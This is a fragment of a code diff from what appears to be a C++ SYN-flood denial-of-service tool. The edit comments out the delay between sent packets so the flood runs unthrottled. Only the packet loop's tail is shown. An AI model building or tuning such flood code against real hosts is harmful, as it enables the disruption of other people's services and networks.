@@ -100,7 +100,7 @@ void SYN::syn_flood(const char* target_ip, int target_port, int packet_count){
             perror("Failed to send packet");
         }
 
-        usleep(1000);  // Small delay to avoid overwhelming the system
+        //usleep(100);  // Small delay to avoid overwhelming the system
     }
 
     close(sock);  // Close the socket after sending packets
